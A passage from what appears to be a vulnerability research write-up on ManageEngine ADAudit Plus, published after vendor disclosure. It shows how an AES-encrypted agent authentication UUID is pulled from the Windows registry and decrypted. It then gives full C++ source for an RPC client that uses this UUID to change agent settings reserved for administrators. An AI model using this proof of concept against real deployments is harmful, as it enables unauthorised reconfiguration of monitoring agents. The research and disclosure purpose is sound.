<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ bytes<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a | base64 -d | xxd -p -c 200<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>user@adpen1:~$ echo -e <span style="color:#e6db74">&#34;Length: </span><span style="color:#e6db74">${</span>bytes:0:4<span style="color:#e6db74">}</span><span style="color:#e6db74">\nKey: </span><span style="color:#e6db74">${</span>bytes:6:64<span style="color:#e6db74">}</span><span style="color:#e6db74">\nIV: </span><span style="color:#e6db74">${</span>bytes:70:32<span style="color:#e6db74">}</span><span style="color:#e6db74">\nciphertext: </span><span style="color:#e6db74">${</span>bytes:102:174<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3336</span>
</span></span><span style="display:flex;"><span>Key: e365d4d12f7077542a0e1c597fb763cf795a06cc0c639ecae47d1a31c9446169
</span></span><span style="display:flex;"><span>IV: d2fa2032eb0b272ae177d5360a370f0b
</span></span><span style="display:flex;"><span>ciphertext: 9350f78a3c6a11c55c0da306dd206d04953bfca5ff13256cf47fff43e5d99ff38690d716e0e7fb6fc98d5c7288d0dd1a
</span></span></code></pre></div><p>Note that the output above is in HEX string format. Meaning that <code>Length:</code> is
two bytes which can be converted to ASCII:</p>
<table>
<thead>
<tr>
<th>HEX String</th>
<th>HEX</th>
<th>DEC</th>
<th>ASCII</th>
</tr>
</thead>
<tbody>
<tr>
<td>33</td>
<td>0x33</td>
<td>51</td>
<td>3</td>
</tr>
<tr>
<td>36</td>
<td>0x36</td>
<td>54</td>
<td>6</td>
</tr>
</tbody>
</table>
<p>Lets try to decrypt the ciphertext using python3:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pip3 install pycryptodome</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;e365d4d12f7077542a0e1c597fb763cf795a06cc0c639ecae47d1a31c9446169&#34;</span>)
</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;d2fa2032eb0b272ae177d5360a370f0b&#34;</span>)
</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;9350f78a3c6a11c55c0da306dd206d04953bfca5ff13256cf47fff43e5d99ff38690d716e0e7fb6fc98d5c7288d0dd1a&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span>print(aes<span style="color:#f92672">.</span>decrypt(ciphertext)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ python3 decrypt_agentauthid.py
</span></span><span style="display:flex;"><span>75fdc297-acc9-4ddb-83da-313cd909f3d6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>user@adpen1:~$ echo -n 75fdc297-acc9-4ddb-83da-313cd909f3d6 | wc -c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span>
</span></span></code></pre></div><p>Very nice. We have UUID, and yes it was 36 characters long. We can test
this as authentication when we communicate with the ADAudit Agent.</p>
<p>Once again we attempt to change the registry item <code>SMStatus</code> to &ldquo;True&rdquo; to enable
the SessionMonitoring process, an action which should only be available
to administrators.</p>
<p>POC:</p>
<p><img src="adauditagent-rpc-activating-smstatus-with-agenauthid.png" alt="adauditagent-rpc-activating-smstatus-with-agenauthid"></p>
<p>The <code>adauditrpc-client</code> has be updated with input arguments and the latest
version will be found at our github page <a href="https://github.com/shelltrail/adauditrpc-client">https://github.com/shelltrail/adauditrpc-client</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#75715e">/* file: adauditrpc-client.cpp */</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;stdlib.h&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;stdio.h&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;ctype.h&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;ADAPAgentRpcPipe_h.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;windows.h&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;rpcrt4.lib&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;iostream&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> wmain(<span style="color:#66d9ef">int</span> argc, wchar_t* argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (argc &lt; <span style="color:#ae81ff">5</span>) {
</span></span><span style="display:flex;"><span>        wprintf(L<span style="color:#e6db74">&#34;Usage: %ls &lt;IP&gt; &lt;AgentGUID&gt; &lt;case&gt; &lt;inputdata&gt;\n&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        wprintf(L<span style="color:#e6db74">&#34;Example - Enable SessionMonitoring: %ls 127.0.0.1 \&#34;1699964702085\&#34; 0 \&#39;\&#34;\&#34;\&#34;SMData\&#34;\&#34;\&#34;:{\&#34;\&#34;\&#34;SMStatus\&#34;\&#34;\&#34;:\&#34;\&#34;\&#34;True\&#34;\&#34;\&#34;}\&#39;\n&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        wprintf(L<span style="color:#e6db74">&#34;Example - Enable Debug: %ls 127.0.0.1 \&#34;1699964702085\&#34; 8 \&#39;\&#34;\&#34;\&#34;ENABLE_DEBUG\&#34;\&#34;\&#34;:true\&#39;\n&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> wchar_t* ip = argv[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    RPC_WSTR NetworkAddress = (RPC_WSTR)ip;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Accessing ADAPAgentRpcPipe named pipe on: %ls\n&#34;</span>, ip);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> wchar_t* agentuid = argv[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Using AgentUID: %ls\n&#34;</span>, agentuid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> arg_0 = std::wcstol(argv[<span style="color:#ae81ff">3</span>], nullptr, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Case: %i\n&#34;</span>, arg_0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> wchar_t* inputdata = argv[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    wchar_t str1[<span style="color:#ae81ff">256</span>] = L<span style="color:#e6db74">&#34;{\&#34;AgentUID\&#34;:\&#34;&#34;</span>; <span style="color:#75715e">// Make sure the array is large enough</span>
</span></span><span style="display:flex;"><span>    wcscat_s(str1, agentuid); <span style="color:#75715e">// Concatenates str1 and agentuid</span>
</span></span><span style="display:flex;"><span>    wcscat_s(str1, L<span style="color:#e6db74">&#34;\&#34;,&#34;</span>); <span style="color:#75715e">// Concatenates str1 and ,</span>
</span></span><span style="display:flex;"><span>    wcscat_s(str1, inputdata); <span style="color:#75715e">// Concatenates str1 and inputdata</span>
</span></span><span style="display:flex;"><span>    wcscat_s(str1, L<span style="color:#e6db74">&#34;}&#34;</span>); <span style="color:#75715e">// Concatenates str1 with }&#34;</span>
</span></span><span style="display:flex;"><span>    wprintf(L<span style="color:#e6db74">&#34;[+] InputData: %ls\n&#34;</span>, str1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    RPC_STATUS status;
</span></span><span style="display:flex;"><span>    RPC_WSTR pszUuid = NULL;
</span></span><span style="display:flex;"><span>    RPC_WSTR pszProtocolSequence = (RPC_WSTR)L<span style="color:#e6db74">&#34;ncacn_np&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//RPC_WSTR pszNetworkAddress = (RPC_WSTR)L&#34;100.64.5.212&#34;;</span>
</span></span><span style="display:flex;"><span>    RPC_WSTR pszNetworkAddress = NetworkAddress;
</span></span><span style="display:flex;"><span>    RPC_WSTR pszEndpoint = (RPC_WSTR)L<span style="color:#e6db74">&#34;\\pipe\\ADAPAgentRpcPipe&#34;</span>;
</span></span><span style="display:flex;"><span>    RPC_WSTR pszOptions = NULL;
</span></span><span style="display:flex;"><span>    RPC_WSTR pszStringBinding = NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//unsigned char * pszString           = &#34;hello, world&#34;;</span>
</span></span><span style="display:flex;"><span>    unsigned <span style="color:#66d9ef">long</span> ulCode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    status = RpcStringBindingCompose(pszUuid,
</span></span><span style="display:flex;"><span>        pszProtocolSequence,
</span></span><span style="display:flex;"><span>        pszNetworkAddress,
</span></span><span style="display:flex;"><span>        pszEndpoint,
</span></span><span style="display:flex;"><span>        pszOptions,
</span></span><span style="display:flex;"><span>        &amp;pszStringBinding);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status) exit(status);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    status = RpcBindingFromStringBinding(pszStringBinding, &amp;DefaultIfName_v1_0_c_ifspec);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status) exit(status);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> arg2_pointer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span>* arg_2 = &amp;arg2_pointer;
</span></span><span style="display:flex;"><span>    RpcTryExcept
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, str1, arg_2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>        RpcExcept(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        ulCode = RpcExceptionCode();
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Runtime reported exception 0x%lx = %ld\n&#34;</span>, ulCode, ulCode);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    RpcEndExcept
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        status = RpcStringFree(&amp;pszStringBinding);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status) exit(status);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    status = RpcBindingFree(&amp;DefaultIfName_v1_0_c_ifspec);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status) exit(status);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/******************************************************/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*         MIDL allocate and free                     */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/******************************************************/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>(malloc(len));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> __RPC_USER midl_user_free(<span style="color:#66d9ef">void</span> __RPC_FAR* ptr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    free(ptr);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="summary">Summary</h2>
<p>In this article we managed to reverse engineer the decryption process of
an encrypted value stored in Windows registry. This decrypted value was an UUID
used as a means of authentication when doing configuration changes via the
ADAudit Agent.</p>
<p>It was a fun and educative process to bit by bit lay the puzzle to
reach the objective and we at Shelltrail hope you enjoyed following along!</p>
<p>Thanks to ManageEngine (Zoho Corp) for handling the disclosure process.</p>
<p>In our three part series of security assessing ADAudit Plus we:</p>
<ul>
<li><a href="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/">Part 1</a> - Reverse engineered our way to build a RPC client</li>
<li><a href="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/">Part 2</a> - Reverse engineered our way to craft valid input to the RPC server</li>
<li><a href="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/">Part 3</a> - Reverse engineered our way to decrypt and AES encrypted cipher stored in Windows registry</li>
</ul>

    </div>

    



    
      








  





  
  
  
    
  
  
  <div class="media author-card" itemscope itemtype="http://schema.org/Person">
    

    <div class="media-body">
      <h5 class="card-title" itemprop="name"><a href="https://www.shelltrail.com/"></a></h5>
      
      
      <ul class="network-icon" aria-hidden="true">
        
      </ul>
    </div>
  </div>



      
      
    

    

    


  </div>
</article>

      

    
    

    
    
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" integrity="sha256-X5PoE3KU5l+JcX+w09p/wHl9AzK333C4hJ2I9S5mD4M=" crossorigin="anonymous"></script>

      

      
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js" integrity="sha256-aYTdUrn6Ow1DDgh5JTc3aDGnnju48y/1c8s1dgkYPQ8=" crossorigin="anonymous"></script>
        
      

      
      
    

    
    

    
    
    

    
    
    <script>hljs.initHighlightingOnLoad();</script>
    

    

    
    

    

    
    

    
    

    
    
    
    
    
    
    
    
    
    
    
    
    <script src="/js/academia.min.6c2ba2801d406881b3c2277043cedd76.js"></script>

    






  
  <div class="container">
    <footer class="site-footer">
  <div class="container">
    <div class="row align-items-center">
      <div class="col-md-6 mb-4 mb-md-0">
        
        <p class="mb-0">
          Copyright  2025 &middot; 
	  Shelltrail AB 559319-6164
        </p>
      </div>
      <div class="col-md-6">
        <ul class="list-inline network-icon text-right mb-0">
          
          
        </ul>
      </div>
    </div>
  </div>
</footer>

  </div>
  

  
<div id="modal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Cite</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <pre><code class="tex hljs"></code></pre>
      </div>
      <div class="modal-footer">
        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
          <i class="fas fa-copy"></i> Copy
        </a>
        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
          <i class="fas fa-download"></i> Download
        </a>
        <div id="modal-error"></div>
      </div>
    </div>
  </div>
</div>

</body>
</html>
